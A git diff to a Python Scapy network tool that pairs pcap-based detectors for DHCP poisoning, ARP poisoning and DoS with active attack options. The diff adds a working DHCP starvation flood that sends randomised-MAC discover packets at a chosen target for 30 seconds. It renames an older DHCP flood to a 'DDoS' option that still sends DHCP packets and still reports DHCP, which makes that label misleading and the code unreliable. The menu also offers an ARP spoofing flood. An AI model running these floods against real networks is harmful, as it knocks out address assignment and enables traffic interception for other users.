@@ -105,10 +105,10 @@ def detect_arp_poisoning(pcap_file):
     except Exception as e:
         print(f"An error occurred while analyzing the pcap file: {e}")
 
-def send_dhcp_flood(target_ip, iface):
+def send_ddos_flood(target_ip, iface):
     try:
         start_time = time.time()
-        print(f"[+] Starting DHCP flooding for 30 seconds targeting {target_ip}")
+        print(f"[+] Starting DDoS flooding for 30 seconds targeting {target_ip}")
         ip_counter = 1  # Counter for incrementing IPs
 
         while time.time() - start_time < 30:
@@ -123,6 +123,23 @@ def send_dhcp_flood(target_ip, iface):
             )
             sendp(dhcp_discover, iface=iface, verbose=False)
             ip_counter += 1  # Increment the counter
+        print("[+] DHCP flood complete.")
+    except Exception as e:
+        print(f"An error occurred during DHCP flooding: {e}")
+
+def send_dhcp_flood(target_ip, iface):
+    try:
+        start_time = time.time()
+        print(f"[+] Starting DHCP flooding for 30 seconds targeting {target_ip}")
+        while time.time() - start_time < 30:
+            dhcp_discover = (
+                Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
+                IP(src="0.0.0.0", dst=target_ip) /
+                UDP(sport=68, dport=67) /
+                BOOTP(chaddr=RandMAC()) /
+                DHCP(options=[("message-type", "discover"), "end"])
+            )
+            sendp(dhcp_discover, iface=iface, verbose=False)
         print("[+] DHCP flood complete.")
     except Exception as e:
         print(f"An error occurred during DHCP flooding: {e}")
@@ -170,9 +187,10 @@ if __name__ == "__main__":
         print("1. Reader (Count protocols)")
         print("2. Detect DHCP Poisoning")
         print("3. Detect ARP Poisoning")
-        print("4. Send DHCP Flood (30 seconds)")
-        print("5. Send ARP Flood (30 seconds)")
-        print("6. Detect DoS Attacks")
+        print("4. Detect DoS Attacks")
+        print("5. Send DDoS (30 seconds)")
+        print("6. Send DHCP Flood (30 seconds)")
+        print("7. Send ARP Flood (30 seconds)")
         print("Type 'exit' to quit.")
         choice = input("Enter your choice: ").strip()
 
@@ -180,7 +198,7 @@ if __name__ == "__main__":
             print("Exiting the program.")
             break
 
-        if choice in ['1', '2', '3', '6']:
+        if choice in ['1', '2', '3', '4']:
             pcap_file_path = input("Enter the path to the pcap file: ").strip()
 
             if choice == '1':
@@ -189,15 +207,20 @@ if __name__ == "__main__":
                 detect_dhcp_poisoning(pcap_file_path)
             elif choice == '3':
                 detect_arp_poisoning(pcap_file_path)
-            elif choice == '6':
+            elif choice == '4':
                 detect_dos_attacks(pcap_file_path)
 
-        elif choice == '4':
+        elif choice == '5':
+            target_ip = input("Enter the target IP address: ").strip()
+            iface = input("Enter the network interface: ").strip()
+            send_ddos_flood(target_ip, iface)
+
+        elif choice == "6":
             target_ip = input("Enter the target IP address: ").strip()
             iface = input("Enter the network interface: ").strip()
             send_dhcp_flood(target_ip, iface)
 
-        elif choice == '5':
+        elif choice == '7':
             target_ip = input("Enter the target IP address: ").strip()
             spoof_ip = input("Enter the spoofed IP address: ").strip()
             target_mac = input("Enter the target MAC address: ").strip()
